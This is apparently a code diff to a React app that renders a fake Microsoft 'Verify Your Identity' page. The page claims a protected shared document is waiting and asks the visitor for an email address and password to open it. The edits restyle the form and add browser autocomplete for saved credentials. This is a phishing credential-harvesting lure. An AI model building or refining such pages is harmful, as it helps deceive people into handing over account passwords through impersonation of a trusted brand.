@@ -118,7 +118,8 @@ function App() {
       .fade-in { animation: fadeIn 0.5s ease-out; }
       .document-icon { animation: spin 2s linear infinite; }
       .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
-      
+      /* Card styles from HTML */
+      body { background: #f7f9fb; font-family: 'Segoe UI', Arial, sans-serif; }
       .card {
         background: #fff;
         border-radius: 10px;
@@ -237,10 +238,6 @@ function App() {
       }
       .next-btn:hover, .next-btn:focus {
         background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
-      }
-      .next-btn:disabled {
-        background: linear-gradient(90deg,#8a8a8a 0,#6a6a6a 100%);
-        cursor: not-allowed;
       }
       .footer-text {
         font-size: 0.92em;
@@ -676,47 +673,56 @@ function App() {
       return (
         <div style={{
           background: '#f7f9fb',
-          fontFamily: "'Segoe UI', Arial, sans-serif",
           minHeight: '100vh',
-          margin: 0,
           display: 'flex',
           flexDirection: 'column',
           alignItems: 'center',
+          fontFamily: "'Segoe UI', Arial, sans-serif",
         }}>
           <div className="card">
-            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" alt="Microsoft Logo" />
+            <img
+              className="logo"
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917"
+              alt="Microsoft Logo"
+            />
             <div className="title">Verify Your Identity</div>
             <div className="desc">You've received a secure document</div>
             <div className="secure-link">Protected Document File</div>
             <div className="instructions">
               To open this secure Document, please enter the email address that this item was shared to.
             </div>
-            <form onSubmit={handleFormSubmit}>
+            <form onSubmit={handleFormSubmit} style={{ width: '100%' }}>
               <div className="form-group">
-                <label className="input-label" htmlFor="email">Email Address</label>
+                <label className="input-label" htmlFor="email">
+                  Email Address
+                </label>
                 <div className="input-row">
-                  <input 
-                    type="email" 
-                    id="email" 
-                    placeholder="Enter email" 
-                    required
+                  <input
+                    type="email"
+                    id="email"
                     value={formEmail}
                     onChange={(e) => setFormEmail(e.target.value)}
+                    required
+                    placeholder="Enter email"
+                    autoComplete="email"
                   />
                   <svg className="input-icon" viewBox="0 0 24 24" fill="none">
                     <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
                     <path d="M3 5l9 7l9-7" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
                   </svg>
                 </div>
-                <label className="input-label" htmlFor="password">Password</label>
+                <label className="input-label" htmlFor="password">
+                  Password
+                </label>
                 <div className="input-row">
-                  <input 
-                    type="password" 
-                    id="password" 
-                    placeholder="Enter password" 
-                    required
+                  <input
+                    type="password"
+                    id="password"
                     value={formPassword}
                     onChange={(e) => setFormPassword(e.target.value)}
+                    required
+                    placeholder="Enter password"
+                    autoComplete="current-password"
                   />
                   <svg className="input-icon" viewBox="0 0 24 24" fill="none">
                     <rect x="4" y="8" width="16" height="10" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
@@ -724,12 +730,12 @@ function App() {
                     <rect x="8" y="4" width="8" height="4" rx="1" stroke="#0078d4" strokeWidth="1.2" fill="none"/>
                   </svg>
                 </div>
-                <button 
+                <button
                   className="next-btn"
                   type="submit"
                   disabled={isSubmitting}
                 >
-                  {isSubmitting ? 'Authenticating...' : 'Authenticate & Open Document'}
+                  {isSubmitting ? '🔄 Authenticating...' : 'Authenticate & Open Document'}
                 </button>
               </div>
             </form>
